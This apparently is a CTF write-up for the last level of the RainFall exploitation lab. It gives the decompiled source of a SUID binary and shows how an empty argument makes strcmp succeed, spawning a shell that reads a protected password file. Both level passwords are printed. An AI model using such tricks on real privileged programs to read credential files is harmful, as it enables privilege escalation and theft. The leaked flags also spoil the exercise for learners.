login as the user `bonus3`


```shell
ssh -p 4242 bonus3@10.13.100.27
bonus3@10.13.100.27's password: 71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587
  GCC stack protector support:            Enabled
  Strict user copy checks:                Disabled
  Restrict /dev/mem access:               Enabled
  Restrict /dev/kmem access:              Enabled
  grsecurity / PaX: No GRKERNSEC
  Kernel Heap Hardening: No KERNHEAP
 System-wide ASLR (kernel.randomize_va_space): Off (Setting: 0)
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   /home/user/bonus3/bonus3
bonus3@RainFall:~$
```

a `SUID` exactable file is locates in the home directory

```c
int32_t main(int32_t argc, char** argv, char** envp)
{
    FILE* fp = fopen("/home/user/end/.pass", u"r…");
    char var_98[0x41];
    __builtin_memset(&var_98, 0, 0x84);

    if (!fp || argc != 2)
        return 0xffffffff;

    fread(&var_98, 1, 0x42, fp);
    char var_57_1 = 0;
    var_98[atoi(argv[1])] = 0;
    char var_56[0x42];
    fread(&var_56, 1, 0x41, fp);
    fclose(fp);

    if (strcmp(&var_98, argv[1]))
        puts(&var_56);
    else
        execl("/bin/sh", "sh", 0);

    return 0;
}
```

the program spawns a shell if the contents of `/home/user/end/.pass` file match the first argument,
but before doing that it passes the first arg into `atoi` and inserts at that index a `\0` to mark the end of the file buffer.
we can exploit this behavior and terminate the string at the very first character.


```shell
bonus3@RainFall:~$ ./bonus3 ""
$ cat /home/user/end/.pass
3321b6f81659f9a71c76616f606e4b50189cecfea611393d5d649f75e157353c
$ su end
Password: 3321b6f81659f9a71c76616f606e4b50189cecfea611393d5d649f75e157353c
end@RainFall:~$ ls -l
-rwsr-s---+ 1 end users 26 Sep 23  2015 end
end@RainFall:~$ cat end
Congratulations graduate!
end@RainFall:~$
```
